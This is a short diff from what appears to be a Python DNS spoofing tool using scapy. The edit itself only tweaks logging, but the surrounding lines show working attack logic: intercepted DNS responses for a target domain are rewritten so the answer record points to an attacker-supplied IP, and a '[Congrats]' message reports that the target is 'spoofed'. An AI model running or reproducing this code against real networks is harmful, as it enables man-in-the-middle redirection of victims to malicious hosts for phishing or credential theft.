@@ -118,11 +118,11 @@ try:
     print("[Info]--> DNS spoofing is started .......")
     def packeting(packet):
         ippacket = sc.IP(packet.get_payload())
-        print(ippacket.show())
+        #print(ippacket.show())
         if ippacket.haslayer(sc.DNSRR):
             reqname = ippacket[sc.DNSQR].qname
             if domain in str(reqname):
-                print("[Congrats] --> Target is spoofed and directed to "+str(ip)+" ....")
+                print("[Congrats] --> Target is spoofed and directed to "+ip+" ....")
                 anspof = sc.DNSRR(rrname=domain, rdata=ip)
                 ippacket[sc.DNS].an = anspof
                 ippacket[sc.DNS].ancount = 1
